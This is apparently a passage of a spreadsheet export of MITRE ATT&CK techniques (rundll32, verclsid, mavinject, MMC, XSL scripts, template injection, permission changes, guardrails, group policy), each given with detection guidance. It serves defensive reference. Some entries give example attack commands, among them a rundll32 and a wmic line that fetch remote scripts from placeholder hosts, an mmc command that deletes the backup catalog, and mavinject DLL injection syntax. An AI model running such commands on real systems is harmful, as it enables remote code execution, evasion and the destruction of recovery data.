Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: &lt;code&gt;rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"&lt;/code&gt;  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command &lt;code&gt;rundll32.exe ExampleDLL.dll, ExampleFunction&lt;/code&gt;, rundll32.exe would first attempt to execute &lt;code&gt;ExampleFunctionW&lt;/code&gt;, or failing that &lt;code&gt;ExampleFunctionA&lt;/code&gt;, before loading &lt;code&gt;ExampleFunction&lt;/code&gt;). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending &lt;code&gt;W&lt;/code&gt; and/or &lt;code&gt;A&lt;/code&gt; to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: &lt;code&gt;rundll32.exe file.dll,#1&lt;/code&gt;).
Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) </t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.
Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.</t>
  </si>
  <si>
    <t>T1218.012</t>
  </si>
  <si>
    <t>Verclsid (T1218.012)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)
Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running &lt;code&gt;verclsid.exe /S /C {CLSID}&lt;/code&gt;, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) </t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.</t>
  </si>
  <si>
    <t>T1218.013</t>
  </si>
  <si>
    <t>Mavinject (T1218.013)</t>
  </si>
  <si>
    <t>Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)
Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. &lt;code&gt;C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL&lt;/code&gt;).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. 
In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  &lt;code&gt;/HMODULE&lt;/code&gt; command-line parameter (ex. &lt;code&gt;mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER&lt;/code&gt;). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)</t>
  </si>
  <si>
    <t>Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity.
Adversaries may rename abusable binaries to evade detections, but the argument &lt;code&gt;INJECTRUNNING&lt;/code&gt; is required for mavinject.exe to perform [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001) and may therefore be monitored to alert malicious activity.</t>
  </si>
  <si>
    <t>T1218.014</t>
  </si>
  <si>
    <t>MMC (T1218.014)</t>
  </si>
  <si>
    <t>Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)
For example, &lt;code&gt;mmc C:\Users\foo\admintools.msc /a&lt;/code&gt; will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is &lt;code&gt;mmc gpedit.msc&lt;/code&gt;, which will open the Group Policy Editor application window. 
Adversaries may use MMC commands to perform malicious tasks. For example, &lt;code&gt;mmc wbadmin.msc delete catalog -quiet&lt;/code&gt; deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: &lt;code&gt;wbadmin.msc&lt;/code&gt; may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)
Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: &lt;code&gt;mmc.exe -Embedding C:\path\to\test.msc&lt;/code&gt;.(Citation: abusing_com_reg)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. 
Monitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as &lt;code&gt;services.msc&lt;/code&gt; or &lt;code&gt;eventvwr.msc&lt;/code&gt;. Invoking non-Microsoft .msc files may be an indicator of malicious activity. </t>
  </si>
  <si>
    <t>T1218.015</t>
  </si>
  <si>
    <t>Electron Applications (T1218.015)</t>
  </si>
  <si>
    <t>Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)
Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c calc.exe`).(Citation: Electron 6-8)
Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)</t>
  </si>
  <si>
    <t>T1219</t>
  </si>
  <si>
    <t>An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)
Remote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.
Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.
Installation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)</t>
  </si>
  <si>
    <t>Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.
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application layer protocols that do not follow the expected protocol for the port that is being used.
[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.</t>
  </si>
  <si>
    <t>T1220</t>
  </si>
  <si>
    <t>Module: Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)
Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)
* &lt;code&gt;msxsl.exe customers[.]xml script[.]xsl&lt;/code&gt;
* &lt;code&gt;msxsl.exe script[.]xsl script[.]xsl&lt;/code&gt;
* &lt;code&gt;msxsl.exe script[.]jpeg script[.]jpeg&lt;/code&gt;
Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)
Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)
* Local File: &lt;code&gt;wmic process list /FORMAT:evil[.]xsl&lt;/code&gt;
* Remote File: &lt;code&gt;wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”&lt;/code&gt;</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.
The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.</t>
  </si>
  <si>
    <t>T1221</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)
Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.
Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)
Adversaries may also modify the &lt;code&gt;*\template&lt;/code&gt; control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)
This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)</t>
  </si>
  <si>
    <t>Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), or other suspicious actions that could relate to post-compromise behavior.
Monitor .rtf files for strings indicating the &lt;code&gt;&amp;#42;\template&lt;/code&gt; control word has been modified to retrieve a URL resource, such as &lt;code&gt;&amp;#42;\template http&lt;/code&gt; or &lt;code&gt;&amp;#42;\template \u-&lt;/code&gt;.</t>
  </si>
  <si>
    <t>T1222</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Metadata, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">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Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).
Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) </t>
  </si>
  <si>
    <t>Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.
Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)</t>
  </si>
  <si>
    <t>T1222.001</t>
  </si>
  <si>
    <t>Windows File and Directory Permissions Modification (T1222.001)</t>
  </si>
  <si>
    <t>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Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)
Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).</t>
  </si>
  <si>
    <t>Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.
Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)</t>
  </si>
  <si>
    <t>T1222.002</t>
  </si>
  <si>
    <t>Linux and Mac File and Directory Permissions Modification (T1222.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">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Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: &lt;code&gt;chown&lt;/code&gt; (short for change owner), and &lt;code&gt;chmod&lt;/code&gt; (short for change mode).
Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) </t>
  </si>
  <si>
    <t>Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include &lt;code&gt;chmod +x&lt;/code&gt;, &lt;code&gt;chmod -R 755&lt;/code&gt;, and &lt;code&gt;chmod 777&lt;/code&gt;.(Citation: 20 macOS Common Tools and Techniques) 
Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.</t>
  </si>
  <si>
    <t>T1480</t>
  </si>
  <si>
    <t>Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)
Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails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guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.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</si>
  <si>
    <t>Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.</t>
  </si>
  <si>
    <t>T1480.001</t>
  </si>
  <si>
    <t>Environmental Keying (T1480.001)</t>
  </si>
  <si>
    <t>Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)
Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).
Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.
Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity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environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.</t>
  </si>
  <si>
    <t>Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.</t>
  </si>
  <si>
    <t>T1480.002</t>
  </si>
  <si>
    <t>Mutual Exclusion (T1480.002)</t>
  </si>
  <si>
    <t>File: File Creation, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)
While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)
In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)
Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)</t>
  </si>
  <si>
    <t>T1482</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)</t>
  </si>
  <si>
    <t xml:space="preserve">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such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)
</t>
  </si>
  <si>
    <t>T1484</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Command: Command Execution</t>
  </si>
  <si>
    <t>Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.
Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.
With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  
* modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)
* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)
* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).
* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)
Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.</t>
  </si>
  <si>
    <t>It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes &lt;code&gt;Set federation settings on domain&lt;/code&gt; and &lt;code&gt;Set domain authentication&lt;/code&gt;.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)(Citation: Microsoft 365 Defender Solorigate) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)
Consider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings.(Citation: Microsoft - Update or Repair Federated domain) Some domain policy modifications, such as changes to federation settings, are likely to be rare.(Citation: Microsoft 365 Defender Solorigate)</t>
  </si>
  <si>
    <t>T1484.001</t>
  </si>
  <si>
    <t>Group Policy Modification (T1484.001)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Command: Command Execution</t>
  </si>
  <si>
    <t>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containers for group policy settings made up of files stored within a predictable network path `\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) 
Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.
Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)
For example, publicly available scripts such as &lt;code&gt;New-GPOImmediateTask&lt;/code&gt; can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying &lt;code&gt;&amp;lt;GPO_PATH&amp;gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml&lt;/code&gt;.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in &lt;code&gt;&amp;lt;GPO_PATH&amp;gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf&lt;/code&gt;, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)</t>
  </si>
  <si>
    <t>It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:
* Event ID 5136 - A directory service object was modified
* Event ID 5137 - A directory service object was created
* Event ID 5138 - A directory service object was undeleted
* Event ID 5139 - A directory service object was moved
* Event ID 5141 - A directory service object was deleted
